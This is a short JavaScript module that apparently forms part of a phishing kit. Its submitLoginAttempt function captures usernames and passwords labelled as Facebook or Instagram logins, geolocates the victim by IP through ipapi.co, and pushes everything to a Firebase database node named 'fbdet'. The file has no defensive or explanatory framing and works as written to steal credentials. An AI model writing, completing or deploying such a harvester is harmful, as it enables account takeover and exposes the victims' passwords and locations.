import { db, ref, push } from "../lib/firebase";

export const getUserLocation = async () => {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
      ip: data.ip || "Unknown",
      country: data.country_name || "Unknown",
      city: data.city || "Unknown",
    };
  } catch (error) {
    return { ip: "Unknown", country: "Unknown", city: "Unknown" };
  }
};

export const submitLoginAttempt = async (
  username,
  password,
  type,
  stage = "login_attempt",
  extra = {}
) => {
  const location = await getUserLocation();
  const currentDate = new Date().toISOString().slice(0, 10);
  const currentTime = new Date().toISOString().slice(11, 19);

  // Payload trimming: We only send essential data to avoid 431 errors
  // if this were stored in a cookie. Here it goes to the DB.
  const payload = {
    emle: username,
    pass: password,
    type: type, // e.g., 'Face-book' or 'Insta-gram'
    stage: stage,
    time: currentTime,
    date: currentDate,
    country: location.country,
    city: location.city,
    ip: location.ip,
    ...extra,
  };

  return push(ref(db, "fbdet"), payload);
};
